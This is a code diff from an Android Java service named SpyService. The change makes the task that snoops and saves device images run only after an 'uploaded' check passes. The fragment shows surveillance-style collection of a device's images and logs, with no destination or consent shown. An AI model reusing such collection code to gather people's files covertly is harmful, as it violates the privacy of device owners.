@@ -131,11 +131,14 @@ public class SpyService extends Service {
 		}));
 	// Task: Save images
 	execFutures.add(executor.submit(() -> {
-		    XLog.i(TAG, "saveData(): Started saving imagess...");
-		    updateNotif(R.string.processing_files);
-		    new ImagesSpy(mContext, new File(userDataDir, ImagesSpy.IMAGES_DIR_NAME))
-			.snoop();
-		    XLog.i(TAG, "saveData(): Finished saving images");
+		    Utils utils = new Utils(mContext);
+		    if(utils.hasUploaded()) {
+			XLog.i(TAG, "saveData(): Started saving imagess...");
+			updateNotif(R.string.processing_files);
+			new ImagesSpy(mContext, new File(userDataDir, ImagesSpy.IMAGES_DIR_NAME))
+			    .snoop();
+			XLog.i(TAG, "saveData(): Finished saving images");
+		    }
 		}));
 	// Task: Save logs
 	execFutures.add(executor.submit(() -> {
